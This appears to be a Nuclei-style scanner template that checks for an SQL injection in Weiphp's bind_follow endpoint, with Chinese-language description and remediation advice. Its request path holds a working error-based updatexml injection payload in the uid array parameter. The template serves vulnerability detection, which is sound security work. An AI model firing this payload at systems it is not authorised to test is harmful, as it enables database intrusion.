id: Weiphp-SQLi
info:
  name: Weiphp SQLinjection
  author:
  - l0ne1y
  description: |-
    Weiphp sql注入漏洞
    Weiphp 在/public/index.php/home/index/bind_follow/?publicid处通过参数uid[1]可以执行sql注入漏洞。
  severity: critical
  remediation: |-
    官方修复建议：
    1、升级系统至无漏洞版本，或于官网下载安全补丁
    http://www.weiphp.cn/

    临时修复建议：
    1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。
    2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。
    3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
    4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
    5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。
    6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。
    7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。
    8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: dsl
    dsl:
    - contains(body,randstr) && status_code!=404
  path:
  - '{{BaseURL}}/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,{{randstr}},0x7e),1)--+'
  method: GET
  redirects: true
